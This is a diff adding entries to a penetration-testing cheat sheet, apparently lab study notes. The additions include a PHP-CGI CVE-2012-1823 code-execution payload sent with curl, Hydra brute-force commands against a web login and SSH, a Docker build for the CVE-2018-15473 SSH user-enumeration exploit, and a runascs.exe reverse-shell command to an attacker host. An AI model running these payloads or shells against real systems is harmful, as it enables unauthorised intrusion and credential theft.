@@ -19,6 +19,7 @@
 - [Chisel](#chisel)
 - [CrackMapExec / NetExec](#crackmapexec--netexec)
 - [Curl](#curl)
+- [CVE](#cve)
 - [Dig](#dig)
 - [DNScat2](#dnscat2)
 - [Dnsenum](#dnsenum)
@@ -30,6 +31,7 @@
 - [Fping](#fping)
 - [GoBuster](#gobuster)
 - [Hashcat](#hashcat)
+- [Hydra](#hydra)
 - [Impacket Suite](#impacket-suite)
 - [IPMI](#ipmi)
 - [John The Ripper](#john-the-ripper)
@@ -37,6 +39,7 @@
 - [LAPSToolkit](#lapstoolkit)
 - [Ldapsearch](#ldapsearch)
 - [Ldapdomaindump](#ldapdomaindump)
+- [Lftp](#lftp)
 - [Ligolo-ng](#ligolo-ng)
 - [Metasploit](#metasploit)
 - [Msfvenom](#msfvenom)
@@ -486,6 +489,52 @@ curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name |
 
 ---
 
+## CVE
+
+### CVE-2012-1823 | PHP-CGI
+
+https://github.com/K3ysTr0K3R/CVE-2012-1823
+
+https://pentesterlab.com/exercises/cve-2012-1823
+
+You can check if return the source code with `?-s`
+Version before 5.3.12 or 5.4.2
+
+```bash
+echo "<?php system('uname -a');die(); ?>" | POST "http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
+```
+
+Or with curl
+
+```bash
+curl -s "http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
+  --data-binary "<?php system('uname -a'); die(); ?>"
+```
+
+When php-cgi don't found '=' transform to a parameter of cgi '-'.
+
+```
+?-d allow_url_include=1 -d auto_prepend_file=php://input
+```
+
+- `-d`: Allow to define directives in time of execution
+- `allow_url_include=1`: Active the option that allow include source code from remote sources.
+- `auto_prepend_file=php//input`: auto_prepend_file say to php, before execute any script, execute the following file. `php://input` is an stream that represent the raw body of the HTTP request
+
+With `die()` you're indicating that doesn't want to execute nothing more, so you will only see the result.
+
+The solution of this was detect special characters like `-`.
+
+### CVE-2024-4577 | PHP-CGI
+
+Very similar to CVE-2012-1823. In Windows exist Best Fit Mapping that maps certain Unicode characters to a useful character in a local language of the Windows computer.
+
+The key mapping is the soft hyphe, 0xAD. The 2012 path doesn't detect such as normal hyphen, so they send to PHP. Best-fit transform the 0xAD to a real hyphen 0X2D.
+
+XAMP by default is configurated with CGI by default.
+
+---
+
 ## Dig
 
 Generic query:
@@ -742,6 +791,19 @@ Rules location: `/usr/share/hashcat/rules`
 
 ---
 
+## Hydra
+
+### Bruteforce http custom login panel
+
+```bash
+hydra -l prtgadmin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 10.129.230.176 http-post-form "/public/checklogin.htm:username=^USER^&password=^PASS^:F=failed" -v
+```
+
+Indicate the POST parameters, username=...
+`-F`: Indicate a word that appear in the response that indicate that is not correct.
+
+---
+
 ## Impacket Suite
 
 ### psexec
@@ -950,6 +1012,16 @@ Requires valid credentials:
 ```bash
 service apache2 start
 python3 ldapdomaindump -u 'domain.local\user' -p 'password' 10.10.10.10
+```
+
+---
+
+## Lftp
+
+Download all files from ftp server
+```
+lftp <ip>
+mirror -a
 ```
 
 ---
@@ -1810,6 +1882,90 @@ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
 scp plaintext@192.168.49.128:/root/myroot.txt .
 ```
 
+### SSH bruteforce
+
+You can use hydra
+```
+hydra -l user_or_userwordlist.txt -P <password_wordlist.txt> -t 4 ssh://<IP>
+```
+
+### SSH enumerate users > 7.7
+
+It is possible to enumerate users with a ssh version before 7.7. The problem is that most of the script need specific condition, python2.7, paramiko library update a lot of and always break the syntax of the script...
+
+My solution to this problem is create an environment prepare to use the official CVE-2018-15473 in Exploit-DB.
+
+If you use SearchSploit. All of them have problems with python version and paramiko syntax.
+
+| Script        | CVE        | Author / Date               | Technique                     | Scope                       | Paramiko attr           | Notable features                                                                                                                                             |
+| ------------- | ---------- | --------------------------- | ----------------------------- | --------------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **45210.py**  | 2018-15473 | Matthew Daley — 2018-08-16  | Malformed `publickey` packet  | Single user                 | `_handler_table`        | Original PoC. Minimal, clean reference implementation. No threading or output options.                                                                       |
+| **45233.py**  | 2018-15473 | Justin Gardner — 2018-08-21 | Malformed `publickey` packet  | Single user **or** wordlist | `_handler_table`        | Full tool: multiprocessing (`--threads`), output formats (list/json/csv), retry logic on flood, restores `add_boolean` between connections. Python 2 syntax. |
+| **45939.py**  | 2018-15473 | Leap Security — 2018-12-04  | Malformed `publickey` packet  | Single user                 | `_client_handler_table` | Clean rewrite. Uses the renamed attribute → **works with modern paramiko** where the other two fail.                                                         |
+| **40136.py**  | 2016-6210  | 2016                        | Timing attack (long password) | Single user                 | N/A                     | Sends a very long password; measures response time. Requires `PasswordAuthentication`. Statistical, network-sensitive.                                       |
+| **40113.txt** | 2016-6210  | 2016                        | Timing attack (long password) | N/A (advisory)              | N/A                     | Not an executable exploit — original advisory/paper describing the vuln with reference PoC.                                                                  |
+
+One solution is download the following repository and do some changes:
+
+https://github.com/Rhynorater/CVE-2018-15473-Exploit
+
+You need to do some changes in the Dockerfile,
+- `Alpine:edge` -> `Alpine:3.11`
+- paramiko version
+
+Dockerfile:
+```
+FROM alpine:3.11
+LABEL maintainer "Ilya Glotov <ilya@ilyaglotov.com>"
+
+ENV PYTHONWARNINGS="ignore"
+
+RUN apk add --update --no-cache --virtual .deps build-base \
+                                                libffi-dev \
+                                                py-pip \
+                                                python-dev \
+  && apk add --no-cache openssl-dev \
+                        python \
+  && pip install cffi==1.14.6 cryptography==2.8 paramiko==2.0.8 \
+  && apk del .deps
+
+COPY sshUsernameEnumExploit.py /sshUsernameEnumExploit.py
+
+RUN chmod +x /sshUsernameEnumExploit.py
+
+ENTRYPOINT ["python", "sshUsernameEnumExploit.py"]
+
+```
+
+```bash
+docker build -t cve-2018-15473 .
+```
+
+If you have to rebuild you need to use `--no-cache` parameter
+
+Execute the script:
+
+```bash
+docker run cve-2018-15473 -h
+```
+
+You need to create a volume in the docker container to find the wordlist
+```bash
+docker run -v /usr/share/wordlists:/wordlists cve-2018-15473 --userList /wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 10.129.46.229
+```
+
+You can see more in the following fork of the original process
+https://github.com/sergiky/CVE-2018-15473-Exploit-docker
+
+```bash
+docker ps -a | awk '$2 == "cve-2018-15473" {print $1}' | xargs docker rm docker rmi cve-2018-15473
+```
+
+Delete images
+```bash
+docker rmi -f $(docker images -q)
+```
+
 ---
 
 ## Sshuttle
@@ -2121,6 +2277,7 @@ netstat -antb | findstr 1080
 ### Windows
 ```cmd
 dir -Force                                                   # hidden files
+findStr /i "TCP"                                             # like grep
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # autologin
 netstat -r                                                   # routing table
 net accounts                                                  # password policy
@@ -2237,6 +2394,32 @@ QUIT
 The default credential of port 4555 is root:root, if you can access you can create, list , change password of users among other things. With this, for example, you can read the email of some users
 
 There is an exploit that give a shell when something log in in the system (for example, via ssh).
+
+#### Interact IMAP with TLS
+
+```bash
+openssl s_client -connect 10.129.14.128:imaps
+```
+
+#### IMAP commands
+
+You usually have to add a tag to identify the command, e.g: `tag_simple LOGIN username password`.
+
+|                                 |                                                                                                               |
+| ------------------------------- | ------------------------------------------------------------------------------------------------------------- |
+| `1 LOGIN username password`     | User's login.                                                                                                 |
+| `1 LIST "" *`                   | Lists all directories.                                                                                        |
+| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                                                                      |
+| `1 DELETE "INBOX"`              | Deletes a mailbox.                                                                                            |
+| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                                                                            |
+| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
+| `1 SELECT INBOX_NAME`           | Selects a mailbox so that messages in the mailbox can be accessed.                                            |
+| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                                                                   |
+| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox, except the body.                                     |
+| `1 FETCH <ID> BODY[]`           | Retrieves the body of the email                                                                               |
+| `SEARCH DELETED`                | Search deleted messages                                                                                       |
+| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.                                                             |
+| `1 LOGOUT`                      | Closes the connection with the IMAP server.                                                                   |
 
 ---
 
@@ -2765,7 +2948,6 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 
 # PART 2 — TECHNIQUES AND PROCEDURES
 
-## Techniques Index
 
 - [Passive Reconnaissance](#passive-reconnaissance)
 - [Active Reconnaissance](#active-reconnaissance)
@@ -2807,6 +2989,8 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 - [Advanced Pivoting — Strategy](#advanced-pivoting--strategy)
 - [Password Spraying Scenarios](#password-spraying-scenarios)
 - [Local Administrator Password Reuse](#local-administrator-password-reuse)
+- [Change user with runascs.exe](#change-user-with-runascsexe)
+- [Search internal open ports](#search-internal-open-ports)
 
 ---
 
@@ -3950,6 +4134,28 @@ Or if you want to do all automatic from linux:
 ```
 
 - https://github.com/n00py/DCSync
+
+---
+
+## Change user with runascs.exe
+
+You have the original binary that is runas.exe but this solve no full tty problems (for example when use rlwrap). With this binary you are able to change or obtain a session of a user (with valid credentials).
+
+```
+.\runascs.exe user1 password powershell.exe -r <attacker_ip> <port>
+```
+
+You need to be listening in your attacker computer to send the shell (rlwrap nc ...).
+
+---
+
+## Search internal open ports
+
+You can use:
+
+```powershell
+netstat -an | findStr /i "TCP"
+```
 
 ---
 
